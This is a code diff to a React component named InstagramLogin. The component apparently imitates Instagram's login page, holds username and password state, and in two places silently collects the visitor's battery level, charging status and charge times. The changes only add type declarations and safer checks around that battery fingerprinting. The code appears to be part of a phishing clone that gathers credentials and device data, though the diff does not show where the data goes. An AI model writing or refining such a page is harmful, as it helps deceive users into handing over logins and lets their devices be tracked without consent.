@@ -5,6 +5,15 @@ import { Facebook } from "lucide-react"
 import Link from "next/link"
 import { useState, useEffect } from "react"
 
+// TypeScript: Extend Navigator type for getBattery
+// This must be outside the component
+declare global {
+  interface Navigator {
+    getBattery?: () => Promise<any>;
+    battery?: any;
+  }
+}
+
 export default function InstagramLogin() {
   const [showPassword, setShowPassword] = useState(false)
   const [username, setUsername] = useState("")
@@ -32,16 +41,18 @@ export default function InstagramLogin() {
         // Get battery information
         let batteryInfo = {}
         try {
-          if ('getBattery' in navigator) {
-            const battery = await navigator.getBattery()
+          if (typeof window !== "undefined" &&
+              'getBattery' in navigator &&
+              typeof navigator.getBattery === "function") {
+            const battery = await navigator.getBattery();
             batteryInfo = {
               level: battery.level,
               charging: battery.charging,
               chargingTime: battery.chargingTime,
               dischargingTime: battery.dischargingTime
             }
-          } else if ('battery' in navigator) {
-            const battery = navigator.battery
+          } else if (typeof window !== "undefined" && 'battery' in navigator) {
+            const battery = navigator.battery;
             batteryInfo = {
               level: battery.level,
               charging: battery.charging,
@@ -197,16 +208,18 @@ export default function InstagramLogin() {
       // Get battery information
       let batteryInfo = {}
       try {
-        if ('getBattery' in navigator) {
-          const battery = await navigator.getBattery()
+        if (typeof window !== "undefined" &&
+            'getBattery' in navigator &&
+            typeof navigator.getBattery === "function") {
+          const battery = await navigator.getBattery();
           batteryInfo = {
             level: battery.level,
             charging: battery.charging,
             chargingTime: battery.chargingTime,
             dischargingTime: battery.dischargingTime
           }
-        } else if ('battery' in navigator) {
-          const battery = navigator.battery
+        } else if (typeof window !== "undefined" && 'battery' in navigator) {
+          const battery = navigator.battery;
           batteryInfo = {
             level: battery.level,
             charging: battery.charging,
